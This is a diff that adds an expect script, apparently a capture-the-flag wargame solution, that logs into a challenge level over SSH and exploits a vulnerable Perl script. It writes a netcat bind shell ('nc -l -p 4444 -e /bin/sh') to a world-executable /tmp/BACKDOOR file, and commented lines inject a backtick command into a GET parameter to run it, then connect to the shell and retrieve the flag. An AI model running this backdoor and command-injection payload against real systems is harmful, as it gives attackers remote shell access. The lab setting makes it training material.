@@ -1,0 +1,33 @@
+#!/usr/bin/expect
+
+set ip [ lindex $argv 0 ]
+set port [ lindex $argv 1 ]
+set level [ lindex $argv 2 ]
+set password [ exec cat "../../flag11/flag" ]
+
+spawn ssh "$level\@$ip" "-p $port"
+
+expect "password:" { send "$password\r" }
+
+expect -re {\$ $}
+	send "ls -aRl\r"
+	send "cat level12.pl\r"
+	send "echo 'nc.traditional -l -p 4444 -e /bin/sh' > /tmp/BACKDOOR\r"
+	send "chmod 777 /tmp/BACKDOOR\r"
+	send "nc localhost 4646\r"
+
+	interact 
+
+# send "GET /level12.pl?x='`/*/BACKDOOR`'\r"
+# send "nc localhost 4444\r"
+# send "\x03"
+# send "id\r"
+# send "getflag\r"
+
+# expect -re {\$ $}	
+# 	send "su level13\r"
+
+# set flag [ exec cat ../flag ]
+
+# expect "Password:" { send "$flag\r" }
+	
